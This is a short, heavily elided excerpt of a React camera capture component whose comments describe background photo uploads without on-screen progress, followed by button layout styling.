// CaptureScreen.jsx - Clean UI (No Upload Status, No Counter)
...
export default function CaptureScreen({
  ...
  // Silent background upload (no UI feedback)
  useEffect(() => {
    ...
    const uploadPhoto = async () => {
      try {
        console.log(`📤 Silently uploading photo ${photoIndex + 1}...`);
  ...
  return (
    ...
    >
      ...
      {/* Control Buttons (Without Back Button) */}
      <div
        style={{
          display: "flex",
          gap: "16px",
